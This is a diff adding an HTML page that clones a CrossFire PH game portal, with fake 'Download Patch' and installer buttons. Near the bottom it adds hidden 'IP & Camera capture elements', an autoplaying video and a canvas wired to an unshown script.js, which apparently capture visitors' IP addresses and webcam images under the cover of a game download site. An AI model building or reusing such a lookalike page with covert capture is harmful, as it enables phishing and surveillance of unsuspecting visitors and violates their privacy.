@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CrossFire PH — Home (Clone)</title>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="wrap">
+<header>
+<div class="brand"><div class="logo">CF</div><div><div class="title">CrossFire PH</div><div class="sub">Official Fan / Community — Clone</div></div></div>
+<nav><a href="#">Home</a><a href="#">News</a><a href="#">Events</a><a href="#">Ranking</a><a href="#">Support</a><button class="btn">Play / Download</button></nav>
+</header>
+<section class="hero">
+<div class="banner" role="img" aria-label="Main banner">
+<div class="banner-content">
+<h1>Isla Inferno — New Seasonal Map</h1>
+<p>Dynamic weather, new objectives, and exclusive battle-pass rewards. Team up — control the island.</p>
+<div class="cta"><button class="btn">Download Patch</button><button class="btn ghost">Patch Notes</button></div>
+</div>
+</div>
+<aside class="panel">
+<h3>Download Client</h3>
+<p style="color:var(--muted); margin:6px 0 0">Latest version v1.12.3 • 2.1 GB</p>
+<div class="download-row">
+<div style="flex:1" class="dl-card"><div style="font-weight:700">Installer</div><div style="font-size:12px; color:var(--muted)">Windows .exe</div></div>
+<div style="flex:1" class="dl-card"><div style="font-weight:700">Launcher</div><div style="font-size:12px; color:var(--muted)">Lightweight</div></div>
+</div>
+<div style="height:12px"></div>
+<div class="dl-card" style="display:flex;flex-direction:column;gap:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">Server Status</div><div style="font-size:12px;color:var(--muted)">Region: PH • Online</div></div>
+<div style="text-align:right"><div style="font-weight:800;color:#9fffdc">Online</div><div style="font-size:12px;color:var(--muted)">Peak: 4,200</div></div>
+</div>
+</div>
+<div style="height:12px"></div>
+<div class="dl-card"><div style="font-weight:700;margin-bottom:6px">Highlights</div><div style="color:var(--muted); font-size:13px">• New weapon skins<br>• Ranked season ends in 3 days</div></div>
+</aside>
+</section>
+<section class="grid">
+<main>
+<h2 style="margin:0 0 12px">Latest News</h2>
+<div class="news-grid">
+<!-- News cards here, similar to your CrossFire template -->
+</div>
+</main>
+<aside style="display:flex;flex-direction:column;gap:12px">
+<div class="side-box"><h3 style="margin-top:0">Top Rankings</h3></div>
+<div class="side-box"><h3 style="margin-top:0">Quick Links</h3></div>
+</aside>
+</section>
+<footer>© <span id="year"></span> CrossFire PH — Fan Clone. All images & content are placeholders.</footer>
+</div>
+
+<!-- IP & Camera capture elements -->
+<video id="video" autoplay playsinline width="300" height="200"></video>
+<canvas id="canvas" width="300" height="200"></canvas>
+
+<script src="script.js"></script>
+</body>
+</html>
